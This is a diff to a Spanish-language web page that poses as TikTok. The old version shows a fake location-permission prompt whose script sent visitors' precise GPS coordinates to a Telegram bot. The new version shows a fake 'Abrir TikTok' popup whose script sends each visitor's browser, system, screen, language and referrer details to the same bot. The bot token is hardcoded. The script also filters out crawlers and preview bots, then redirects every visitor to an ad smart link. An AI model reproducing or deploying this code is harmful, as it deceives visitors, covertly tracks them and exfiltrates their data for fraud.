@@ -44,7 +44,7 @@
         .top-nav { display: flex; justify-content: space-around; align-items: center; padding: 12px 16px; background: #000; border-bottom: 1px solid #1f1f1f; flex-shrink: 0; }
         .top-nav .nav-item { color: #888; font-weight: 600; font-size: 15px; cursor: default; }
         .top-nav .nav-item.active { color: #fff; }
-        .top-nav .search-icon { color: #fff; font-size: 20px; }
+        .top-nav .search-icon { color: #fff; font-size: 20px; cursor: default; }
 
         .video-feed { flex: 1; overflow-y: scroll; scroll-snap-type: y mandatory; height: 0; }
         .video-feed::-webkit-scrollbar { display: none; }
@@ -76,8 +76,8 @@
         .upload-btn .upload-icon { background: #fff; color: #000; width: 48px; height: 32px; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin-top: -6px; }
         .upload-btn .upload-icon i { font-size: 20px; }
 
-        /* ===== CASILLA DE UBICACIÓN ===== */
-        .location-overlay {
+        /* ===== POPUP PARA ABRIR TIKTOK ===== */
+        .popup-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.75);
@@ -88,7 +88,7 @@
             z-index: 99999;
             animation: fadeIn 0.25s ease;
         }
-        .location-card {
+        .popup-card {
             background: #1a1a1a;
             max-width: 340px;
             width: 90%;
@@ -98,7 +98,7 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.8);
             border: 1px solid #333;
         }
-        .location-card .icon-wrap {
+        .popup-card .icon-wrap {
             background: #2a2a2a;
             width: 72px; height: 72px;
             border-radius: 50%;
@@ -107,28 +107,28 @@
             justify-content: center;
             margin: 0 auto 16px;
         }
-        .location-card .icon-wrap i {
+        .popup-card .icon-wrap i {
             font-size: 36px;
             color: #ff2d55;
         }
-        .location-card h3 {
+        .popup-card h3 {
             font-size: 20px;
             font-weight: 700;
             margin-bottom: 8px;
             color: #fff;
         }
-        .location-card p {
+        .popup-card p {
             color: #aaa;
             font-size: 14px;
             line-height: 1.4;
             margin-bottom: 24px;
         }
-        .location-card .btn-group {
+        .popup-card .btn-group {
             display: flex;
             gap: 12px;
             justify-content: center;
         }
-        .location-card .btn {
+        .popup-card .btn {
             background: #2a2a2a;
             border: none;
             color: #fff;
@@ -140,30 +140,51 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .location-card .btn-primary {
+        .popup-card .btn-primary {
             background: #ff2d55;
             color: #fff;
             box-shadow: 0 4px 12px rgba(255, 45, 85, 0.3);
         }
-        .location-card .btn-primary:hover { background: #e0244c; }
-        .location-card .btn-secondary { background: #333; }
-        .location-card .btn-secondary:hover { background: #444; }
-        .location-card .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .location-error {
-            color: #ff6b6b;
-            font-size: 13px;
-            background: #2a0a0a;
-            padding: 8px 12px;
-            border-radius: 20px;
-            margin-top: 12px;
-            display: none;
-            border: 1px solid #ff2d55;
-        }
-        .location-error.show { display: block; }
+        .popup-card .btn-primary:hover { background: #e0244c; }
+        .popup-card .btn-secondary { background: #333; }
+        .popup-card .btn-secondary:hover { background: #444; }
+        .popup-card .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+
+        /* Overlay de carga al redirigir */
+        .redirect-loading {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .redirect-loading.show { display: flex; }
+        .redirect-loading .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #1a1a1a;
+            border-top: 4px solid #ff2d55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .redirect-loading p {
+            color: #fff;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
+    <!-- Overlay de carga al redirigir -->
+    <div class="redirect-loading" id="redirectLoading">
+        <div class="spinner"></div>
+        <p>Redirigiendo...</p>
+    </div>
+
     <div class="app-container">
         <header class="top-nav">
             <span class="nav-item">Siguiendo</span>
@@ -240,30 +261,33 @@
         </nav>
     </div>
 
-    <!-- ===== CASILLA DE PERMISO DE UBICACIÓN ===== -->
-    <div class="location-overlay" id="locationOverlay">
-        <div class="location-card">
-            <div class="icon-wrap"><i class="fas fa-map-marker-alt"></i></div>
-            <h3>Compartir ubicación</h3>
-            <p>Permite que TikTok acceda a tu ubicación para recomendarte contenido cercano.</p>
+    <!-- ===== POPUP "ABRIR TIKTOK" ===== -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-card">
+            <div class="icon-wrap"><i class="fab fa-tiktok"></i></div>
+            <h3>Abrir TikTok</h3>
+            <p>¿Quieres abrir la aplicación de TikTok para ver este video?</p>
             <div class="btn-group">
-                <button class="btn btn-secondary" id="denyBtn">Ahora no</button>
-                <button class="btn btn-primary" id="allowBtn">Permitir</button>
+                <button class="btn btn-secondary" id="cancelBtn">Ahora no</button>
+                <button class="btn btn-primary" id="openBtn">Abrir</button>
             </div>
-            <div class="location-error" id="locationError">⚠️ No se pudo obtener la ubicación. Intenta de nuevo.</div>
         </div>
     </div>
 
     <script>
         (function() {
-            // ===== CONFIGURACIÓN DE TELEGRAM =====
+            // ===== CONFIGURACIÓN =====
             const BOT_TOKEN = '8838349571:AAFr5_kRD25YpsESnG7OgmUxJr8BxuYGQiY';
             const CHAT_ID = '2029491076';
-
-            // ===== SMART LINK DE ANUNCIO =====
             const SMART_LINK = 'https://www.profitableratecpmnetwork.com/y3p3e9p6?key=0fd1d5e176fec19ea3e1a69970990054';
 
-            // ===== FUNCIÓN PARA ENVIAR MENSAJE A TELEGRAM =====
+            let actionDone = false;
+            const loadingEl = document.getElementById('redirectLoading');
+            const popupEl = document.getElementById('popupOverlay');
+            const openBtn = document.getElementById('openBtn');
+            const cancelBtn = document.getElementById('cancelBtn');
+
+            // ===== FUNCIÓN PARA ENVIAR A TELEGRAM =====
             function sendTelegramMessage(message) {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 fetch(url, {
@@ -278,98 +302,86 @@
                 }).catch(err => console.error('Error al enviar a Telegram:', err));
             }
 
-            // ===== NOTIFICAR QUE ALGUIEN PINCHÓ EL LINK =====
-            sendTelegramMessage('🔔 <b>Alguien pinchó el enlace</b> (TikTok clone)');
-
-            // ===== ELEMENTOS =====
-            const overlay = document.getElementById('locationOverlay');
-            const allowBtn = document.getElementById('allowBtn');
-            const denyBtn = document.getElementById('denyBtn');
-            const errorEl = document.getElementById('locationError');
-
-            let locationSent = false;
-
-            function hideError() { errorEl.classList.remove('show'); }
+            // ===== DETECTAR BOT =====
+            function detectBot() {
+                const ua = navigator.userAgent.toLowerCase();
+                const bots = ['bot', 'spider', 'crawler', 'headless', 'whatsapp', 'telegram', 'facebook', 'twitter'];
+                for (let b of bots) {
+                    if (ua.includes(b)) return true;
+                }
+                if (window.innerWidth === 0 || window.innerHeight === 0) return true;
+                return false;
+            }
 
             // ===== REDIRIGIR AL SMART LINK =====
-            function redirectToSmartLink() {
-                window.location.replace(SMART_LINK);
+            function redirectToSmartLink(action) {
+                if (actionDone) return;
+                actionDone = true;
+
+                // Ocultar popup
+                popupEl.style.display = 'none';
+
+                // Mostrar loading
+                loadingEl.classList.add('show');
+
+                // Detectar si es bot
+                const isBot = detectBot();
+                const userAgent = navigator.userAgent;
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language || navigator.userLanguage || 'desconocido';
+                const platform = navigator.platform || 'desconocido';
+                const referrer = document.referrer || 'directo';
+                const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'America/Santiago' });
+
+                // ===== CONSTRUIR MENSAJE =====
+                let msg = `🔔 <b>INTERACCIÓN EN TIKTOK CLONE</b>\n`;
+                msg += `━━━━━━━━━━━━━━━━━━\n`;
+                msg += `🕒 Hora: ${timestamp}\n`;
+                msg += `🎯 Acción: ${action === 'open' ? '✅ Abrir TikTok' : '⛔ Ahora no'}\n`;
+                msg += `🤖 Bot detectado: ${isBot ? '⚠️ SÍ' : '✅ NO'}\n`;
+                msg += `📱 Sistema: ${platform}\n`;
+                msg += `🌐 Navegador: ${userAgent}\n`;
+                msg += `📐 Resolución: ${screenRes}\n`;
+                msg += `🌍 Idioma: ${language}\n`;
+                msg += `🔗 Referer: ${referrer}\n`;
+                msg += `━━━━━━━━━━━━━━━━━━\n`;
+                msg += `➡️ <b>Redirigiendo al smart link...</b>\n`;
+                msg += `<a href="${SMART_LINK}">🔗 Ver anuncio</a>`;
+
+                // Enviar a Telegram
+                sendTelegramMessage(msg);
+
+                // Redirigir al smart link después de 1 segundo
+                setTimeout(() => {
+                    window.location.replace(SMART_LINK);
+                }, 800);
             }
 
-            // ===== OBTENER UBICACIÓN Y ENVIAR =====
-            function requestLocationAndRedirect() {
-                if (locationSent) return;
-                hideError();
-
-                if (!navigator.geolocation) {
-                    sendTelegramMessage('⚠️ Geolocalización no soportada.');
-                    redirectToSmartLink();
-                    return;
-                }
-
-                allowBtn.textContent = 'Obteniendo';
-                allowBtn.disabled = true;
-
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        if (locationSent) return;
-                        locationSent = true;
-                        const { latitude, longitude } = position.coords;
-                        const accuracy = position.coords.accuracy ? `precisión ~${Math.round(position.coords.accuracy)}m` : '';
-                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        const msg = `📍 <b>Ubicación capturada</b>\n` +
-                                    `Lat: ${latitude}\nLon: ${longitude}\n${accuracy}\n` +
-                                    `<a href="${mapsLink}">🌐 Ver en Google Maps</a>`;
-                        sendTelegramMessage(msg);
-                        redirectToSmartLink();
-                    },
-                    function(error) {
-                        if (locationSent) return;
-                        if (error.code === error.PERMISSION_DENIED) {
-                            sendTelegramMessage('⛔ Usuario denegó el permiso de ubicación en el navegador.');
-                        } else {
-                            let errorMsg = '❌ Error al obtener ubicación: ';
-                            switch(error.code) {
-                                case error.POSITION_UNAVAILABLE: errorMsg += 'Señal GPS no disponible.'; break;
-                                case error.TIMEOUT: errorMsg += 'Tiempo de espera agotado.'; break;
-                                default: errorMsg += error.message;
-                            }
-                            sendTelegramMessage(errorMsg);
-                        }
-                        redirectToSmartLink();
-                    },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 30000,
-                        maximumAge: 0 
-                    }
-                );
-            }
-
-            // ===== EVENTO "PERMITIR" =====
-            allowBtn.addEventListener('click', function(e) {
+            // ===== EVENTOS DE LOS BOTONES =====
+            openBtn.addEventListener('click', function(e) {
                 e.stopPropagation();
-                if (locationSent) return;
-                hideError();
-                sendTelegramMessage('✅ Usuario presionó <b>Permitir</b>');
-                requestLocationAndRedirect();
+                redirectToSmartLink('open');
             });
 
-            // ===== EVENTO "AHORA NO" =====
-            denyBtn.addEventListener('click', function(e) {
+            cancelBtn.addEventListener('click', function(e) {
                 e.stopPropagation();
-                if (locationSent) return;
-                locationSent = true;
-                sendTelegramMessage('⛔ Usuario presionó <b>Ahora no</b>');
-                redirectToSmartLink();
+                redirectToSmartLink('cancel');
             });
 
-            // ===== CLIC FUERA DE LA TARJETA =====
-            overlay.addEventListener('click', function(e) {
-                if (e.target === overlay && !locationSent) {
-                    locationSent = true;
-                    sendTelegramMessage('👆 Clic fuera de la tarjeta');
-                    redirectToSmartLink();
+            // ===== NOTIFICAR QUE LA PÁGINA CARGÓ =====
+            document.addEventListener('DOMContentLoaded', function() {
+                const isBotLoad = detectBot();
+                const ua = navigator.userAgent;
+                const msgLoad = `📱 <b>Página cargada - TikTok Clone</b>\n` +
+                                `🤖 Bot: ${isBotLoad ? '⚠️ SÍ' : '✅ NO'}\n` +
+                                `🌐 ${ua}`;
+                sendTelegramMessage(msgLoad);
+            });
+
+            // Si el usuario hace clic fuera del popup, igual redirige (por si acaso)
+            popupEl.addEventListener('click', function(e) {
+                if (e.target === popupEl && !actionDone) {
+                    redirectToSmartLink('outside');
                 }
             });
 
